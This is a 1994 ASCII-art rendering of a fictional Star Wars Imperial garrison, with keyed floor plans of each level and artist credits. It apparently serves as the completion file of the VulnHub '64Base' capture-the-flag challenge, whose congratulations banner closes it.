 /____|__|__/__|______l__|||||__l______|__\__|__|____\ ll   <~

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                                 O u t e r   D e f e n s e s
            |                      |             ---------------------------
         ^_[]_^                 ^_[]_^
         |----|               5 |----|        1 ... High Voltage Death Fence
 ________`-..-'________4________`-..-'______  2 ....... Perimeter Gate House
 ===========================================  3 ........ Powered Force Field
          `||'                   `||'         4 .......... Fortified Catwalk
           ||     ^==^   ^==^     ||          5 ......... Observattion tower
 ___.____._ll_._1_|--|   |--|___._ll_.____.____
 XXX|XXXX|XIIX|XXX|--| 3 |--|XXX|XIIX|XXXX|XXXX
 XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX

 The outer perimeter is  marked  by a  high-voltage  "death fence."  Powered
 Force fields  placed at regular intervals along the fence may be turned off
 to permit entry and exit.  Observation towers,  connected by fortified cat-
 walks,  are set back from the fence and constantly manned by stormtroopers.
 Other outer  defenses  include energy mine fields,  modified patrol Droids,
 and AT-ST Scout Walkers.

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             _
            /|                               L a n d i n g   P l a t f o r m
          -==+                               -------------------------------
            :
         [__________]               Up to two Lambda-class shuttles and four
         `' ||  ||`-'               AT-AT  Walkers can dock at the platform.
           ========  =xx            A loading  ramp  leads directly from the
            ||  ||    ll            platform into the garrison complex.
     ~~~~~~~~~~~~~~~~~~~~~~
____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                     I n t e r i o r ,   L e v e l s   1 - 5
                                     ---------------------------------------

          ______         ______      The first 5 levels of the garrison com-
         / ____ \_______/ ____ \     plex are of identical layout, construc-
        / /    \_________/    \ \    ted  around  a  level-spanning  surface
       / /      |   3   |  5   \ \   vehicle bay.  Refer to the key below to
       \ \       \_____/_______/ /   determine what each level contains.
       / /    o   |o o|   o    \ \
    __/ /  2    .' o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),
   / __/      .' ._o_o_. `.      \__ \         Armory (levels 3-4), Training
  / /  `-.  .' .'  10   `. `.  .-'  \ \        Facilities   and   Recreation
 / /      ~' .'`-._____.-'`. `~      \ \       Rooms (level 5)
 \ \     o  <  C  | | |  D  >  o  7  / / 2 ... Stormtrooper Barracks (levels
  \ \__      \    ' ' '    /      __/ /        1-3),    Security    Barracks
   \__ \  1  |----  9  ----|~-._ / __/         (levels 4-5)
      \ \    |====    B====|    Y /      3 ...... Base Security (levels 1-5)
       \ \   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)
       / /   |__A_     _ __| 8 \ \       5 .... Detention Block (levels 1-5)
       \ \      | |   | |      / /       6 ... Technical and Service Person-
        \ \_____| |   | |_____/ /              nel Barracks (levels 1-5)
         \_____ `o|   |o' _____/         7 ... Technical Shops (levels 1-2),
               `--'   `--'                     Medical   Bay    (level   3),
                                               Science Labs (levels 4-5)
                8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)
                9 ...................... Surface Vehicle  Bay  (levels 1-5):
                A .................................. AT-ST Scout Walker Bays
                B ........................................ AT-AT Walker Bays
                C ...................... Vehicle Maintenance and Repair Deck
                D ........................................ Speeder Bike Deck
                10 ........................... Miscellaneous Vehicle Parking

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                           I n t e r i o r ,   L e v e l   6
                                           ---------------------------------
         ____           ____
        / __ \_________/ __ \        Base command personnel,  control rooms,
       / /  \___________/  \ \       rooms,  trade  mission,  and diplomatic
       \ \ o     oo      o / /       offices are located on this level.
       / /       oo----.   \ \
      / /   8  __oo     `.1 \ \      1 ....... Sensor Monitors, Tractor Beam
   __/ /\    .~  ||   2   \  \ \__                       and Shield Controls
  / __/  \ .' 9.-'`-.      | /\__ \  2 ....................... Computer Room
 / /   o  \|__:   o  :_____|/ o  \ \ 3 ....................... Meeting Rooms
 \ \__  7 .---: 10   :------.3 __/ / 4 ...... Officers' and Pilots' Quarters
  \__ \  /     `-..-'        \/ __/  5 ... Trade Mission, Diplomatic Offices
     \ \/\   5   ||          / /     6 ........... Base Commander's Quarters
      \ \ `.     ||    4    / /                                  and offices
       \ \ o~`---||      o / /       7 ............ Officer Recreation Rooms
       / /6  ____||_____   \ \       8 ............................. Offices
       \ \__/ _________ \__/ /       9 ................... Base Control Room
        \____/         \____/        10 ..................... Reception Area


____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                           I n t e r i o r ,   L e v e l   7
                                           ---------------------------------
        __             __
       /_]\           /[_\        The TIE Fighter  Hanger  Deck  houses  the
       \ \,===========./ /        garrison's TIE fighters in standard-design
       //:o-----------o:\\        ceiling racks.  Bases are usually equipped
      /// X  X X X X  X \\\       with  30 TIE fighters and five TIE bombers
     /// X X  X_X_X  X X \\\      (a single  bomber  takes  up the same rack
  __/// X X   [___]   X X \\\__   space as two fighters).  Five  to 15 ships
 /\_/o X X  1 &/3\&    X X o\_/\  are on constant  patrol,  depending on the
 \]_\\ X X   <\\_//>       //_[/  base's readiness level.
    \\\ X X   \>&</2  X []///
     \\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks
      \\\ X   [] []     ///                           (holds up to 40 craft)
       \\:o-----------o://        2 ............. Lift Platforms, to Level 8
       /_/`==========='\_\        3 .................. Flight Control Center
       \_]/           \[_/        X ............................ TIE Fighter
                                  [] ............................ TIE Bomber

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                           I n t e r i o r ,   L e v e l   8
                                           ---------------------------------
                                                      (not shown)

  The Flight Deck contains the  tractor beam  generators which catapult out-
  going craft into the open sky and reel in landing ships. Pilots relinquish
  control of  their ships during take off and landing because of the limited
  maneuvering area within the chutes.

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                               S u b - L e v e l   I n s t a l l a t i o n s
                               ---------------------------------------------
                                                (not shown)

  A large underground section of the base  houses the main power and back-up
  generators, the tractor beam and deflector shield generators, the environ-
  ment  control  station,  and  the  waste  disposal and refuse units.  Some
  storage facilities are also located here.

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Version 1.9 (released 941211).
 Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob
 VanderClay and Joe Rumsey.  The pictures work best when shown on a white on
 black screen  (except for some faces)  with a not too fancy font. Contribu-
 tions welcome, email to the adress below. Sources LS: The Star Wars Source-
 book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source-
 book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.

____________________________________________________________________________

  ______  ______  ______  ______  ______  ______  ______  ______  
 |______||______||______||______||______||______||______||______||______|
  _   _   ____ __          __ __     __ ____   _    _  _  _____   ______  
 | \ | | / __ \\ \        / / \ \   / // __ \ | |  | |( )|  __ \ |  ____|
 |  \| || |  | |\ \  /\  / /   \ \_/ /| |  | || |  | ||/ | |__) || |__
 | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  __|
 | |\  || |__| |  \  /\  /       | |  | |__| || |__| |   | | \ \ | |____  
 |_| \_| \____/    \/  \/        |_|   \____/  \____/    |_|  \_\|______|
                                _  ______  _____  _____  _
             /\                | ||  ____||  __ \|_   _|| |
            /  \               | || |__   | |  | | | |  | |
           / /\ \          _   | ||  __|  | |  | | | |  | |
          / ____ \        | |__| || |____ | |__| |_| |_ |_|
         /_/    \_\        \____/ |______||_____/|_____|(_)
  ______  ______  ______  ______  ______  ______  ______  ______  ______  
 |______||______||______||______||______||______||______||______||______|


                    I hope you enjoyed this challenge
                    Please leave comments & feedback
                    @ https://www.vulnhub.com/?q=64base
                    -----------------------------------
                    64Base Challenge by 3mrgnc3
                    @ https://3mrgnc3.ninja
                    -----------------------------------
```
